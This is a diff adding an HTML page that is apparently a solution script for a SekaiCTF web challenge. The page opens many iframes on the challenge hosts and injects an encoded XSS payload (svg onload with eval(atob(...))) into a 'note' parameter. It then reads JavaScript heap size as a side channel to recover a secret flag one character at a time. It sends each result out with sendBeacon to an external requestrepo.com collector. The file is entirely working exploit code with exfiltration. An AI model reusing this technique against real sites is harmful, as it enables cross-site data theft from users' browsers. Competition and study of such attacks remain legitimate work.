@@ -1,0 +1,89 @@
+<html>
+
+<head>
+
+</head>
+
+<body>
+    <script>
+        window.addEventListener("load", async () => {
+            function solve(char) {
+                setTimeout(() => top.postMessage({ heap: performance.memory.usedJSHeapSize, char: char }, "*"), 5);
+            }
+
+            async function getCharacter(idx, toTest) {
+                let promise = new Promise((resolve) => {
+                    let messageEvent = (e) => {
+                        if (e.data.char == toTest.charCodeAt()) {
+                            window.removeEventListener("message", messageEvent);
+                            resolve(e.data);
+                        }
+                    }
+
+                    window.addEventListener("message", messageEvent);
+                });
+
+                let frame = document.createElement("iframe");
+                let img = `<svg/onload="eval(atob('${btoa(solve.toString())}')); solve(${toTest.charCodeAt()})">`
+
+                frame.src = `https://nbv-${idx}-${toTest.charCodeAt()}.chals.sekai.team/frame.html?note=${encodeURIComponent(img)}`
+
+                document.body.appendChild(frame);
+                let result = await promise;
+                document.body.removeChild(frame);
+
+                return result
+            }
+
+            let flag = "SEKAI{";
+            let baseLine = await getCharacter(0, flag.charAt(0));
+
+            let threshold = baseLine.heap - (baseLine.heap / 10);
+            navigator.sendBeacon(`https://l2jxfjii.requestrepo.com/?baseLine=${threshold}&y=${baseLine.heap}`);
+            const BATCH = 4;
+
+            let alphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}|!"#$%&\'()*+,-./:;<=>?@[\\]^`~ ';
+            while (flag.charAt(flag.length - 1) != "}") {
+                let found = false;
+
+                let obj = {};
+
+                for (let alphabetIndex = 0; alphabetIndex < alphabet.length; alphabetIndex += BATCH) {
+                    if (found)
+                        break;
+
+                    let charsLeft = Math.min(alphabet.length - alphabetIndex, BATCH);
+                    let promises = []
+
+                    for (let frameIdx = 0; frameIdx < charsLeft; frameIdx++) {
+                        let toTest = alphabet.charAt(alphabetIndex + frameIdx);
+
+                        promises.push(getCharacter(flag.length, toTest));
+                    }
+
+                    let results = await Promise.all(promises);
+
+                    for (let result of results) {
+                        obj[result.char] = result.heap
+                        if (result.heap > threshold) {
+                            found = true;
+                        }
+                    }
+                }
+
+                // if (!found)
+                //     break;
+
+                const [char, value] = Object.entries(obj).reduce((maxPair, currentPair) => {
+                    return currentPair[1] > maxPair[1] ? currentPair : maxPair;
+                });
+                flag += String.fromCharCode(char);
+                navigator.sendBeacon(`https://l2jxfjii.requestrepo.com/?x=${encodeURIComponent(flag)}`);
+            }
+            navigator.sendBeacon(`https://l2jxfjii.requestrepo.com/?x=finish`);
+
+        })
+    </script>
+</body>
+
+</html>
